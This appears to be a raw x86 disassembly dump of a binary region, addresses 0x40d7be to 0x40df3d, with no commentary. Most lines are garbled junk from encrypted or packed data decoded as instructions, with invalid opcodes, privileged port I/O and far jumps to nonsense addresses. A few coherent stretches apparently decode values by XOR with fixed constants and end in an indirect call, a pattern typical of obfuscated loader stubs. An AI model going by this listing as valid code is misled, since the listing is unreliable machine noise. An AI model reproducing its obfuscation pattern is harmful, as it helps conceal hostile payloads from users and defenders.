  40d7be:	mov    BYTE PTR [esi+0x6bb02879],ch
  40d7c4:	add    esp,DWORD PTR [eax]
  40d7c6:	xchg   edx,eax
  40d7c7:	or     edi,DWORD PTR [ecx+0x35]
  40d7ca:	and    cl,bl
  40d7cc:	out    dx,al
  40d7cd:	int3   
  40d7ce:	jae    0x40d77b
  40d7d0:	xchg   ecx,eax
  40d7d1:	cdq    
  40d7d2:	cmp    dl,bl
  40d7d4:	clc    
  40d7d5:	gs rol ch,cl
  40d7d8:	sub    esi,ebx
  40d7da:	mov    ds:0x6fc61453,eax
  40d7df:	push   ebp
  40d7e0:	pushf  
  40d7e1:	or     ah,BYTE PTR ds:0xc3cbada
  40d7e7:	add    al,BYTE PTR [esp+eax*2]
  40d7ea:	out    0x1a,eax
  40d7ec:	or     BYTE PTR [edx+0x56],bl
  40d7ef:	or     ebp,edx
  40d7f1:	push   cs
  40d7f2:	add    al,0x6e
  40d7f4:	es pop esp
  40d7f6:	jne    0x40d7d2
  40d7f8:	fcmovu st,st(7)
  40d7fa:	sbb    ecx,eax
  40d7fc:	leave  
  40d7fd:	mov    bl,0xc0
  40d7ff:	xor    BYTE PTR ds:[esi],0x46
  40d803:	pop    edi
  40d804:	push   eax
  40d805:	sub    eax,0x3e787a4f
  40d80a:	pop    ss
  40d80b:	xchg   ecx,eax
  40d80c:	in     eax,dx
  40d80d:	mov    dl,0xb8
  40d80f:	ret    0xd595
  40d812:	xor    al,0xd2
  40d814:	pop    esp
  40d815:	sub    BYTE PTR [ebx+0x30631949],dl
  40d81b:	push   ebx
  40d81c:	or     al,0x9e
  40d81e:	jnp    0x40d889
  40d820:	sti    
  40d821:	das    
  40d822:	cs into 
  40d824:	es xchg ecx,eax
  40d826:	retf   0x3508
  40d829:	out    0xd8,eax
  40d82b:	pop    ds
  40d82c:	push   edi
  40d82d:	leave  
  40d82e:	jle    0x40d87a
  40d830:	scas   eax,DWORD PTR es:[edi]
  40d831:	mov    edi,0x49bdb396
  40d836:	xchg   ebx,eax
  40d837:	outs   dx,BYTE PTR ds:[esi]
  40d838:	sbb    DWORD PTR [edi+0x2a8b5f0d],edi
  40d83e:	mov    ebp,0x580bc849
  40d843:	clc    
  40d844:	into   
  40d845:	fidiv  DWORD PTR [edx+0x6139a100]
  40d84b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d84c:	ins    BYTE PTR es:[edi],dx
  40d84d:	mov    BYTE PTR [esi+0x22],bh
  40d850:	xchg   ecx,eax
  40d851:	gs inc esp
  40d853:	inc    ebp
  40d854:	mov    ecx,esi
  40d856:	std    
  40d857:	lock inc eax
  40d859:	in     al,dx
  40d85a:	jmp    0x56a:0x59b15433
  40d861:	dec    ecx
  40d862:	pop    ebx
  40d863:	xchg   ebx,ecx
  40d865:	sub    ebx,ecx
  40d867:	jmp    0x40d9b0
  40d86c:	adc    edx,DWORD PTR [edi+esi*2]
  40d86f:	jae    0x40d8e2
  40d871:	jno    0x40d886
  40d873:	je     0x40d880
  40d875:	(bad)  
  40d876:	adc    ecx,edx
  40d878:	sub    DWORD PTR [ebp-0x71],ebp
  40d87b:	int    0x29
  40d87d:	mov    bh,BYTE PTR [esi+0x7e]
  40d880:	and    bh,BYTE PTR [edi+0x7e]
  40d883:	jle    0x40d811
  40d885:	shr    DWORD PTR [eax],0xff
  40d888:	das    
  40d889:	mov    ebx,0xe6b63f9d
  40d88e:	pop    eax
  40d88f:	push   es
  40d890:	out    dx,al
  40d891:	fld    QWORD PTR [edi-0x75]
  40d894:	fld    QWORD PTR [edi+0x1680ca17]
  40d89a:	das    
  40d89b:	jne    0x40d8bd
  40d89d:	fstp   QWORD PTR [edi-0x5e]
  40d8a0:	sub    eax,0x82a39631
  40d8a5:	out    0xea,eax
  40d8a7:	mov    ebx,0xdeb5773
  40d8ac:	pop    esp
  40d8ad:	sub    esi,esi
  40d8af:	mov    bl,0x64
  40d8b1:	neg    BYTE PTR [edx-0x6611993]
  40d8b7:	push   ebp
  40d8b8:	xchg   ebx,eax
  40d8b9:	push   es
  40d8ba:	sub    eax,0x8d16c2d9
  40d8bf:	outs   dx,BYTE PTR ds:[esi]
  40d8c0:	dec    edi
  40d8c1:	and    dl,dl
  40d8c3:	enter  0xdc0a,0x47
  40d8c7:	daa    
  40d8c8:	mov    eax,0x8ce13da5
  40d8cd:	adc    bh,dl
  40d8cf:	aaa    
  40d8d0:	push   ss
  40d8d1:	aas    
  40d8d2:	mov    eax,esi
  40d8d4:	push   edi
  40d8d5:	(bad)  
  40d8d6:	push   ss
  40d8d7:	mov    edx,DWORD PTR [edx]
  40d8d9:	mov    al,0xa4
  40d8db:	cli    
  40d8dc:	mov    ah,0x84
  40d8de:	sub    cl,BYTE PTR ds:0x370cde20
  40d8e4:	mov    ch,0x68
  40d8e6:	call   FWORD PTR [edi]
  40d8e8:	adc    al,0xa1
  40d8ea:	push   0x677b171d
  40d8ef:	xchg   ecx,eax
  40d8f0:	iret   
  40d8f1:	xor    DWORD PTR [esi],ecx
  40d8f3:	sub    DWORD PTR [ebx-0x6d],0x4d9bf730
  40d8fa:	xor    al,0x4b
  40d8fc:	test   eax,0xdd15cd02
  40d901:	jnp    0x40d954
  40d903:	fninit 
  40d905:	fiadd  DWORD PTR [ebp+0x78]
  40d908:	xor    BYTE PTR [ebx-0x9],dl
  40d90b:	pop    es
  40d90c:	jns    0x40d8b0
  40d90e:	repnz div DWORD PTR [edi]
  40d911:	xchg   DWORD PTR es:[eax],eax
  40d914:	ret    0xd12e
  40d917:	inc    esi
  40d918:	jmp    0x40d951
  40d91a:	mov    al,ds:0x8f3bdaba
  40d91f:	pop    ebx
  40d920:	mov    ah,0xf5
  40d922:	pop    esp
  40d923:	inc    ebp
  40d924:	in     al,dx
  40d925:	xor    al,0x39
  40d927:	jge    0x40d996
  40d929:	(bad)  
  40d92a:	stc    
  40d92b:	inc    ecx
  40d92c:	retf   
  40d92d:	test   ebx,edx
  40d92f:	mov    ecx,0xc491d43f
  40d934:	sbb    DWORD PTR ds:0x790e60e5,ecx
  40d93a:	int    0xc2
  40d93c:	jbe    0x40d9b8
  40d93e:	gs (bad) 
  40d941:	sub    dh,bl
  40d943:	lock jl 0x40d930
  40d946:	push   ecx
  40d947:	push   0xf9b0054b
  40d94c:	mov    BYTE PTR [esi+0x51],0xbd
  40d950:	pusha  
  40d951:	xchg   edi,eax
  40d952:	(bad)  
  40d953:	pop    ds
  40d954:	pusha  
  40d955:	iret   
  40d956:	imul   esi,DWORD PTR [edi-0x46564d85],0xbe16f39
  40d960:	xor    DWORD PTR [esi],0xffffffc4
  40d963:	mov    WORD PTR [ebx+0x3600a843],ds
  40d969:	ja     0x40d903
  40d96b:	pop    ds
  40d96c:	dec    edx
  40d96d:	xchg   edx,eax
  40d96e:	ret    0x2758
  40d971:	adc    al,0xa1
  40d973:	mov    ecx,0x8f7a963e
  40d978:	call   0xba3d:0x6cd7a1f
  40d97f:	xchg   esi,eax
  40d980:	sbb    edx,DWORD PTR [edi+0xd]
  40d983:	icebp  
  40d984:	rol    DWORD PTR [edi],0xb7
  40d987:	loope  0x40da07
  40d989:	mov    dh,BYTE PTR [esi+ecx*1]
  40d98c:	cdq    
  40d98d:	mov    dh,0x1
  40d98f:	ret    0x7b2
  40d992:	sub    esi,DWORD PTR [ebx+eax*2+0xfe85042]
  40d999:	adc    bl,BYTE PTR [ecx+0x35]
  40d99c:	add    al,0xd0
  40d99e:	ins    BYTE PTR es:[edi],dx
  40d99f:	in     al,0xf7
  40d9a1:	mov    al,0x5f
  40d9a3:	cmc    
  40d9a4:	jbe    0x40d9ea
  40d9a6:	fdivr  QWORD PTR [ebp-0x665e1bd7]
  40d9ac:	fwait
  40d9ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9ae:	xchg   edx,eax
  40d9af:	xor    DWORD PTR [edi+0x144e9cb],eax
  40d9b5:	add    BYTE PTR [eax],al
  40d9b7:	mov    ebx,0xf146cba5
  40d9bc:	jo     0x40da11
  40d9be:	mov    eax,ds:0x3f48df24
  40d9c3:	push   0xfffffff9
  40d9c5:	pop    eax
  40d9c6:	sub    al,0xdd
  40d9c8:	mov    edi,DWORD PTR [esi+0x7e]
  40d9cb:	and    bh,BYTE PTR [edi+0x7e]
  40d9ce:	jle    0x40da30
  40d9d0:	push   esp
  40d9d1:	sbb    al,bh
  40d9d3:	or     eax,DWORD PTR [ebp+edi*4-0x14176d5b]
  40d9da:	mov    cs,WORD PTR [ecx+eiz*8-0x55199b88]
  40d9e1:	mov    dh,0xa0
  40d9e3:	call   0x8c11b5ef
  40d9e8:	sub    eax,0xee26df7e
  40d9ed:	jno    0x40d9fa
  40d9ef:	mov    eax,0x82a0622
  40d9f4:	aam    0x39
  40d9f6:	mov    ah,0xa3
  40d9f8:	mov    al,ds:0x1271b0c5
  40d9fd:	pop    esi
  40d9fe:	dec    ebx
  40d9ff:	punpcklbw mm4,DWORD PTR [edx+0x649d1978]
  40da06:	dec    edx
  40da07:	stos   BYTE PTR es:[edi],al
  40da08:	(bad)  
  40da09:	retf   0x9798
  40da0c:	xchg   ecx,eax
  40da0d:	cs xchg ebx,eax
  40da0f:	ret    0xdf8a
  40da12:	popa   
  40da13:	jmp    0x4f88:0xdd5e445c
  40da1a:	int3   
  40da1b:	repnz mov ebp,esi
  40da1e:	dec    eax
  40da1f:	push   ss
  40da20:	xlat   BYTE PTR ds:[ebx]
  40da21:	pop    esp
  40da22:	rol    BYTE PTR [edi+0x18],0xc
  40da26:	mov    ebx,0xa2ff55ef
  40da2b:	fidivr DWORD PTR [esi-0x7755efa6]
  40da32:	push   0x15b61c68
  40da37:	inc    edx
  40da38:	pop    edi
  40da39:	pop    esi
  40da3a:	sbb    DWORD PTR [ecx],ebp
  40da3c:	mov    al,BYTE PTR [esi-0xe]
  40da3f:	mov    bl,0xcc
  40da41:	ins    BYTE PTR es:[edi],dx
  40da42:	mov    bl,BYTE PTR [eax+0xe2a2d15]
  40da48:	fldenv [edi-0x462c27e1]
  40da4e:	or     dh,BYTE PTR [esi-0x46]
  40da51:	push   ecx
  40da52:	fwait
  40da53:	inc    eax
  40da54:	mov    eax,ds:0x19281af0
  40da59:	mov    edi,0x49ff95c1
  40da5e:	fmul   QWORD PTR [ebp-0x11091ad]
  40da64:	test   WORD PTR [ebp+0x2e],0x949d
  40da6a:	or     eax,0x6a3b3a89
  40da6f:	imul   ebx,DWORD PTR [esi+0x33],0xffffffbd
  40da73:	ret    0x741d
  40da76:	push   ebp
  40da77:	inc    edx
  40da78:	or     al,0xe3
  40da7a:	mov    edi,0x789b4d54
  40da7f:	push   ebx
  40da80:	dec    esp
  40da81:	xchg   BYTE PTR [esi],ch
  40da83:	icebp  
  40da84:	cmc    
  40da85:	fldcw  WORD PTR [ecx-0x5c766624]
  40da8b:	xchg   ch,bl
  40da8d:	xor    eax,0xcea8b045
  40da92:	nop
  40da93:	fldcw  WORD PTR [ecx-0x2d]
  40da96:	mov    eax,ds:0xe6f18a3d
  40da9b:	dec    eax
  40da9c:	scas   al,BYTE PTR es:[edi]
  40da9d:	clc    
  40da9e:	xor    BYTE PTR [edx-0x21],bh
  40daa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daa2:	push   cs
  40daa3:	xchg   ebx,eax
  40daa4:	jge    0x40dabd
  40daa6:	dec    ebx
  40daa7:	fcmovb st,st(7)
  40daa9:	inc    esi
  40daaa:	pop    ds
  40daab:	outs   dx,DWORD PTR ds:[esi]
  40daac:	jp     0x40da9f
  40daae:	psubd  mm0,QWORD PTR ds:0x85024279
  40dab5:	push   ebp
  40dab6:	sbb    DWORD PTR [ebx-0x32],esp
  40dab9:	adc    eax,0x6f04e220
  40dabe:	inc    ebx
  40dabf:	adc    cl,BYTE PTR [ecx+0x1f]
  40dac2:	mov    bh,0xeb
  40dac4:	loope  0x40dae9
  40dac6:	out    0xd4,eax
  40dac8:	xchg   edi,eax
  40dac9:	sar    DWORD PTR [ecx-0x4e25792f],0x94
  40dad0:	cmp    al,0xae
  40dad2:	dec    eax
  40dad3:	inc    edi
  40dad4:	cdq    
  40dad5:	lea    esp,ds:0xe2ac19ab
  40dadb:	adc    esi,DWORD PTR [edx]
  40dadd:	dec    ecx
  40dade:	add    ah,BYTE PTR [ecx-0x4df9fbbc]
  40dae4:	xchg   ebp,eax
  40dae5:	add    eax,0x92bfc95
  40daea:	push   ds
  40daeb:	add    al,0x25
  40daed:	jb     0x40db42
  40daef:	xor    eax,0x4fd8297b
  40daf4:	rcl    DWORD PTR [eax-0x5c4da607],1
  40dafa:	test   eax,0xe4458b49
  40daff:	imul   eax,ecx
  40db02:	sub    esp,eax
  40db04:	mov    DWORD PTR [ebp-0x24],esp
  40db07:	mov    eax,DWORD PTR [ebp-0x4]
  40db0a:	mov    ecx,0x7510854
  40db0f:	xor    eax,ecx
  40db11:	mov    edx,0x32729b
  40db16:	add    eax,edx
  40db18:	mov    DWORD PTR [ebp+0x8],eax
  40db1b:	mov    eax,DWORD PTR [ebp-0x18]
  40db1e:	xor    eax,ecx
  40db20:	jmp    0x40dc69
  40db25:	fsub   DWORD PTR [edx+0x35701da8]
  40db2b:	imul   esp,DWORD PTR [ebx+0x3b],0x47b6fdf0
  40db32:	fs cld 
  40db34:	inc    BYTE PTR [ecx+0x227e7e88]
  40db3a:	jg     0x40dbba
  40db3c:	jle    0x40db8a
  40db3e:	aam    0xeb
  40db40:	(bad)  
  40db42:	mov    dh,al
  40db44:	test   al,0x6c
  40db46:	cli    
  40db47:	add    eax,0xbc49e485
  40db4c:	xor    dh,dh
  40db4e:	pop    edi
  40db4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db50:	and    ecx,DWORD PTR ds:0xe08bef5b
  40db56:	jo     0x40dbc1
  40db58:	xor    DWORD PTR [esp+edi*1],esi
  40db5b:	xchg   ebx,eax
  40db5c:	scas   eax,DWORD PTR es:[edi]
  40db5d:	test   DWORD PTR [eax],esp
  40db5f:	pop    es
  40db60:	add    BYTE PTR [esi+ebp*4],dl
  40db63:	inc    esp
  40db64:	jp     0x40dbd8
  40db66:	leave  
  40db67:	fcom   QWORD PTR [esi+0x6a]
  40db6a:	xor    ebp,eax
  40db6c:	and    DWORD PTR [ebx-0x6f1a5462],ebp
  40db72:	dec    esp
  40db73:	clc    
  40db74:	add    ebp,DWORD PTR [di]
  40db77:	dec    eax
  40db78:	jo     0x40db65
  40db7a:	dec    edi
  40db7b:	sbb    DWORD PTR [edi],ebx
  40db7d:	xor    BYTE PTR [ebp-0x43b9221b],al
  40db83:	jle    0x40dbfc
  40db85:	outs   dx,DWORD PTR ds:[esi]
  40db86:	arpl   WORD PTR [ebp+0xabf431f],bx
  40db8c:	xor    eax,0x170f1600
  40db91:	or     eax,0x1ce92030
  40db96:	leave  
  40db97:	xor    BYTE PTR [ebx+0x7b],ch
  40db9a:	rcr    DWORD PTR [edi],cl
  40db9c:	jmp    0x8717:0x3f024f7b
  40dba3:	mov    cl,dh
  40dba5:	jns    0x40db8f
  40dba7:	mov    DWORD PTR [eax],eax
  40dba9:	sub    eax,0x7b4356f0
  40dbaf:	aaa    
  40dbb0:	pushf  
  40dbb1:	xchg   esi,eax
  40dbb2:	jmp    0x40db75
  40dbb4:	mov    edx,DWORD PTR [esi-0x2dbbd48f]
  40dbba:	dec    edi
  40dbbb:	push   esi
  40dbbc:	add    dh,BYTE PTR [edi]
  40dbbe:	cmc    
  40dbbf:	popa   
  40dbc0:	popa   
  40dbc1:	jecxz  0x40dc14
  40dbc3:	add    al,0x92
  40dbc5:	js     0x40dc32
  40dbc7:	mov    ss,eax
  40dbc9:	pop    ebx
  40dbca:	sbb    BYTE PTR [esi],bh
  40dbcc:	add    eax,0x3b7d2f1a
  40dbd1:	cmp    DWORD PTR [esi-0x7a7e71a2],esp
  40dbd7:	sti    
  40dbd8:	mov    al,ds:0xbca0ab3c
  40dbdd:	gs call 0x265d:0xde9e2a41
  40dbe5:	into   
  40dbe6:	sub    cl,BYTE PTR [ecx+0x51]
  40dbe9:	push   edi
  40dbea:	sbb    DWORD PTR [ecx],0xe3fc216b
  40dbf0:	(bad)  
  40dbf1:	call   0xf502b0e4
  40dbf6:	cmc    
  40dbf7:	ins    BYTE PTR es:[edi],dx
  40dbf8:	xchg   ebp,eax
  40dbf9:	dec    edx
  40dbfa:	stc    
  40dbfb:	dec    esi
  40dbfc:	and    esp,esi
  40dbfe:	or     eax,0x586a1f02
  40dc03:	retf   
  40dc04:	loop   0x40dbd9
  40dc06:	xchg   esp,eax
  40dc07:	lods   al,BYTE PTR ds:[esi]
  40dc08:	or     eax,0xe059b163
  40dc0d:	push   0x42
  40dc0f:	sbb    eax,0x22775d35
  40dc14:	clc    
  40dc15:	ins    BYTE PTR es:[edi],dx
  40dc16:	dec    ecx
  40dc17:	inc    ebp
  40dc18:	addr16 push ds
  40dc1a:	cmp    DWORD PTR [ebx+eiz*2-0x33ad764],0x5ad447f4
  40dc25:	aas    
  40dc26:	jle    0x40dc6c
  40dc28:	das    
  40dc29:	cli    
  40dc2a:	adc    BYTE PTR [edi-0x6b],bl
  40dc2d:	jg     0x40dbe7
  40dc2f:	inc    eax
  40dc30:	ss mov eax,0xc677aa40
  40dc36:	mov    dh,ah
  40dc38:	por    mm3,QWORD PTR [ecx-0x69]
  40dc3c:	outs   dx,BYTE PTR ds:[esi]
  40dc3d:	jno    0x2d2c2d52
  40dc43:	pop    eax
  40dc44:	mov    eax,0xc84d48be
  40dc49:	mov    dh,0xe5
  40dc4b:	jmp    0x40dcab
  40dc4d:	into   
  40dc4e:	out    dx,eax
  40dc4f:	ja     0x40dc52
  40dc51:	pop    eax
  40dc52:	loop   0x40dbe7
  40dc54:	aaa    
  40dc55:	fs iret 
  40dc57:	add    BYTE PTR [ebp+0x6cd1ebfd],bh
  40dc5d:	sbb    bl,BYTE PTR [eax]
  40dc5f:	test   BYTE PTR ds:0x9a19a08,ch
  40dc65:	cli    
  40dc66:	push   eax
  40dc67:	pusha  
  40dc68:	dec    esp
  40dc69:	add    eax,edx
  40dc6b:	mov    edx,DWORD PTR [ebp+0x14]
  40dc6e:	imul   eax,DWORD PTR [edx]
  40dc71:	mov    edx,DWORD PTR [ebp-0x4]
  40dc74:	xor    edx,ecx
  40dc76:	mov    ecx,DWORD PTR [ebp+0x8]
  40dc79:	lea    ecx,[edx+ecx*1+0x32729b]
  40dc80:	cmp    ecx,eax
  40dc82:	je     0x40de42
  40dc88:	mov    edi,DWORD PTR [ebp-0x18]
  40dc8b:	mov    eax,DWORD PTR [ebp+0x8]
  40dc8e:	mov    edx,DWORD PTR [ebp+0x14]
  40dc91:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40dc95:	mov    ecx,0x7510854
  40dc9a:	xor    edx,edx
  40dc9c:	xor    edi,ecx
  40dc9e:	mov    esi,0x32729b
  40dca3:	add    edi,esi
  40dca5:	div    edi
  40dca7:	mov    edx,DWORD PTR [ebp-0x4]
  40dcaa:	xor    edx,ecx
  40dcac:	lea    eax,[edx+eax*1+0x32729b]
  40dcb3:	mov    edx,DWORD PTR [ebp+0x8]
  40dcb6:	mov    edi,DWORD PTR [ebp-0x24]
  40dcb9:	mov    DWORD PTR [edi+edx*4],eax
  40dcbc:	mov    eax,DWORD PTR [ebp-0x18]
  40dcbf:	mov    edx,DWORD PTR [ebp+0x8]
  40dcc2:	xor    eax,ecx
  40dcc4:	lea    eax,[eax+edx*1+0x32729b]
  40dccb:	jmp    0x40de14
  40dcd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	and    eax,0xb1913513
  40dcd7:	stos   DWORD PTR es:[edi],eax
  40dcd8:	jp     0x40dc9c
  40dcda:	mov    ch,0x9b
  40dcdc:	jno    0x40dd2f
  40dcde:	sub    BYTE PTR [eax-0x4b],cl
  40dce1:	mov    DWORD PTR [esi+0x7e],edi
  40dce4:	and    bh,BYTE PTR [edi+0x7e]
  40dce7:	jle    0x40dc8d
  40dce9:	mov    ds:0x4cc7cce6,al
  40dcee:	lock pop esp
  40dcf0:	dec    ecx
  40dcf1:	iret   
  40dcf2:	inc    ebx
  40dcf3:	mov    ebp,0x5fd77a6e
  40dcf8:	cs cmp al,0x24
  40dcfb:	and    eax,0x8d1eab2
  40dd00:	popa   
  40dd01:	add    eax,0x43e91b13
  40dd06:	ins    DWORD PTR es:[edi],dx
  40dd07:	and    edi,DWORD PTR [esi+0x5d]
  40dd0a:	loopne 0x40dd7f
  40dd0c:	mov    DWORD PTR [ebp+eax*4-0x45a9d7d],esp
  40dd13:	pusha  
  40dd14:	dec    esp
  40dd15:	inc    esi
  40dd16:	scas   eax,DWORD PTR es:[edi]
  40dd17:	arpl   ax,bx
  40dd19:	push   ecx
  40dd1a:	pusha  
  40dd1b:	js     0x40dcbb
  40dd1d:	sub    ecx,DWORD PTR [ebx+0x69]
  40dd20:	ja     0x40dd3f
  40dd22:	add    BYTE PTR [ebp+esi*1-0x5a47e56d],cl
  40dd29:	add    eax,DWORD PTR [ebx]
  40dd2b:	outs   dx,DWORD PTR ds:[esi]
  40dd2c:	mov    al,BYTE PTR [esi-0x6907671c]
  40dd32:	xchg   BYTE PTR [ecx-0x66],ch
  40dd35:	xor    bl,bl
  40dd37:	push   eax
  40dd38:	cmp    eax,0x81c4a552
  40dd3d:	inc    edx
  40dd3e:	ds dec eax
  40dd40:	es lock jmp 0x443176eb
  40dd47:	cmp    ecx,DWORD PTR [ecx+edi*1]
  40dd4a:	cmp    al,0xf3
  40dd4c:	mov    al,ds:0x30f87da0
  40dd51:	sbb    BYTE PTR [ebp-0xeff783b],dl
  40dd57:	xor    al,0xbf
  40dd59:	xlat   BYTE PTR ds:[ebx]
  40dd5a:	mov    al,BYTE PTR [ebx+eax*1-0x74d005df]
  40dd61:	mov    BYTE PTR [edi+0x4f],dh
  40dd64:	sbb    al,0xe1
  40dd66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dd67:	scas   al,BYTE PTR es:[edi]
  40dd68:	ins    BYTE PTR es:[edi],dx
  40dd69:	test   eax,0xfd967487
  40dd6e:	pop    edx
  40dd6f:	push   0x7290546a
  40dd74:	adc    al,dl
  40dd76:	jmp    0x40dd0c
  40dd78:	push   ebx
  40dd79:	daa    
  40dd7a:	aas    
  40dd7b:	das    
  40dd7c:	popf   
  40dd7d:	pop    ss
  40dd7e:	pop    ebx
  40dd7f:	mov    ebx,0xacc3397c
  40dd84:	jnp    0x40dd0b
  40dd86:	(bad)  
  40dd87:	popa   
  40dd88:	cdq    
  40dd89:	stc    
  40dd8a:	or     al,0x1b
  40dd8c:	sahf   
  40dd8d:	aaa    
  40dd8e:	jle    0x40dd8c
  40dd90:	ss add cl,ah
  40dd93:	inc    edi
  40dd94:	xchg   ecx,eax
  40dd95:	push   0x2f
  40dd97:	and    al,0xbb
  40dd99:	fcmovne st,st(2)
  40dd9b:	xchg   esi,eax
  40dd9c:	inc    edi
  40dd9d:	arpl   WORD PTR [edi-0x53],bp
  40dda0:	sbb    BYTE PTR [ebx-0x4c],cl
  40dda3:	pushf  
  40dda4:	(bad)  
  40dda5:	fdivr  DWORD PTR [edi]
  40dda7:	sti    
  40dda8:	mov    ecx,0x122a6fdb
  40ddad:	sub    al,0xb4
  40ddaf:	mov    ds:0x9a42e908,al
  40ddb4:	sbb    dl,dh
  40ddb6:	fwait
  40ddb7:	popf   
  40ddb8:	cmc    
  40ddb9:	stos   BYTE PTR es:[edi],al
  40ddba:	outs   dx,DWORD PTR ds:[esi]
  40ddbb:	dec    ecx
  40ddbc:	and    BYTE PTR [ebx-0x23e3299c],ch
  40ddc2:	mov    edx,DWORD PTR [esi+ebx*1+0xee2df11]
  40ddc9:	das    
  40ddca:	fld    TBYTE PTR [edi+0x51]
  40ddcd:	aaa    
  40ddce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddcf:	pop    es
  40ddd0:	icebp  
  40ddd1:	xchg   esp,eax
  40ddd2:	sbb    al,0x98
  40ddd4:	(bad)  
  40ddd5:	(bad)  
  40ddd6:	adc    esi,esi
  40ddd8:	jg     0x40de04
  40ddda:	stc    
  40dddb:	ror    DWORD PTR [edi+ebp*4],1
  40ddde:	out    dx,al
  40dddf:	leave  
  40dde0:	add    dl,0x1f
  40dde3:	adc    ah,dh
  40dde5:	fbld   TBYTE PTR [ebx+edx*8-0x6e]
  40dde9:	add    eax,0x679332d6
  40ddee:	(bad)  
  40ddf0:	inc    ebp
  40ddf1:	fs ss inc edi
  40ddf4:	adc    ch,0xf3
  40ddf7:	stc    
  40ddf8:	pop    es
  40ddf9:	sub    eax,0xa7acc7e7
  40ddfe:	push   esi
  40ddff:	add    bh,BYTE PTR [ecx+0x15]
  40de02:	inc    esp
  40de03:	imul   edx,DWORD PTR [ecx],0x115ff19d
  40de09:	xor    ebx,ecx
  40de0b:	inc    eax
  40de0c:	ror    BYTE PTR [esi+0x20],0xdb
  40de10:	pop    es
  40de11:	pop    eax
  40de12:	aam    0x87
  40de14:	mov    DWORD PTR [ebp+0x8],eax
  40de17:	mov    eax,DWORD PTR [ebp-0x18]
  40de1a:	mov    edx,DWORD PTR [ebp+0x14]
  40de1d:	xor    eax,ecx
  40de1f:	add    eax,esi
  40de21:	imul   eax,DWORD PTR [edx]
  40de24:	mov    edx,DWORD PTR [ebp-0x4]
  40de27:	xor    edx,ecx
  40de29:	mov    ecx,DWORD PTR [ebp+0x8]
  40de2c:	lea    ecx,[edx+ecx*1+0x32729b]
  40de33:	cmp    ecx,eax
  40de35:	jne    0x40dc88
  40de3b:	mov    ebx,esi
  40de3d:	jmp    0x40de47
  40de42:	mov    ebx,0x32729b
  40de47:	mov    eax,DWORD PTR [ebp-0x4]
  40de4a:	xor    eax,0x7510854
  40de4f:	add    eax,ebx
  40de51:	mov    DWORD PTR [ebp-0xc],eax
  40de54:	xor    ebx,ebx
  40de56:	lea    eax,[ebp-0x10]
  40de59:	add    ebx,DWORD PTR [eax]
  40de5b:	call   ebx
  40de5d:	xor    ebx,ebx
  40de5f:	inc    ebx
  40de60:	cmp    DWORD PTR [ebp+0x10],ebx
  40de63:	je     0x40dfca
  40de69:	xchg   edx,eax
  40de6a:	push   0xa
  40de6c:	pop    ecx
  40de6d:	push   0x4
  40de6f:	pop    ebx
  40de70:	jmp    0x40dfb9
  40de75:	call   0x7013:0x71175975
  40de7c:	jno    0x40de7d
  40de7e:	ins    DWORD PTR es:[edi],dx
  40de7f:	add    BYTE PTR [edx+0x15e38f93],al
  40de85:	pop    ecx
  40de86:	xchg   esi,eax
  40de87:	jle    0x40df07
  40de89:	and    bh,BYTE PTR [edi+0x7e]
  40de8c:	jle    0x40dede
  40de8e:	aas    
  40de8f:	lahf   
  40de90:	das    
  40de91:	pop    ds
  40de92:	add    al,0x74
  40de94:	ins    BYTE PTR es:[edi],dx
  40de95:	dec    edx
  40de96:	pop    edx
  40de97:	ins    DWORD PTR es:[edi],dx
  40de98:	ins    DWORD PTR es:[edi],dx
  40de99:	das    
  40de9a:	fmul   DWORD PTR [esp+edi*8]
  40de9d:	mov    bl,0xdb
  40de9f:	inc    ecx
  40dea0:	jnp    0x40deec
  40dea2:	or     al,0x6f
  40dea4:	pop    esp
  40dea5:	call   DWORD PTR [ecx+0x4c8165ee]
  40deab:	add    esp,ecx
  40dead:	frstor [ebp+0x0]
  40deb0:	std    
  40deb1:	or     edx,ebp
  40deb3:	and    ecx,edi
  40deb5:	lahf   
  40deb6:	scas   al,BYTE PTR es:[edi]
  40deb7:	fdiv   QWORD PTR [ebx+0x77]
  40deba:	das    
  40debb:	ficomp WORD PTR [edx+0x2c]
  40debe:	push   0xffffffc2
  40dec0:	cmp    dh,BYTE PTR [eax-0x1fbb8c29]
  40dec6:	in     al,dx
  40dec7:	shl    ch,1
  40dec9:	cwde   
  40deca:	pop    ebx
  40decb:	jl     0x40dec6
  40decd:	mov    BYTE PTR [ebx-0x107e0f55],0x78
  40ded4:	xlat   BYTE PTR ds:[ebx]
  40ded5:	jne    0x40df10
  40ded7:	jbe    0x40df56
  40ded9:	and    eax,DWORD PTR [edi-0x55]
  40dedc:	rcr    BYTE PTR [eax],0xfc
  40dedf:	hlt    
  40dee0:	mov    ds:0x3d4cb82f,eax
  40dee5:	fistp  WORD PTR [esi+edi*2]
  40dee8:	sar    DWORD PTR [edx+0x4f8e4945],cl
  40deee:	outs   dx,DWORD PTR ds:[esi]
  40deef:	xchg   ecx,eax
  40def0:	dec    BYTE PTR [esi]
  40def2:	imul   eax,DWORD PTR [edi-0x250841e0],0xffffff88
  40def9:	retf   0x3a3
  40defc:	test   DWORD PTR [esi],eax
  40defe:	xor    ch,al
  40df00:	aaa    
  40df01:	dec    esp
  40df02:	mov    WORD PTR [esi],es
  40df04:	push   ss
  40df05:	or     BYTE PTR [ebx-0x18],ch
  40df08:	xchg   ebx,eax
  40df09:	in     eax,0xf7
  40df0b:	cwde   
  40df0c:	xor    ah,cl
  40df0e:	loopne 0x40df4e
  40df10:	test   eax,0xdb9c8dff
  40df15:	cmp    BYTE PTR [ecx+0xe9ec1c8],ah
  40df1b:	push   esi
  40df1c:	mov    al,ds:0x6ffc4fbf
  40df21:	jne    0x40deb2
  40df23:	mov    WORD PTR [ebx+0xff8be5b],es
  40df29:	test   DWORD PTR [ebx+0x2170053],0x1e2cba06
  40df33:	or     al,0x8b
  40df35:	mov    bh,0x51
  40df37:	inc    eax
  40df38:	mov    bh,0x2d
  40df3a:	add    cl,ch
  40df3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df3d:	cdq    
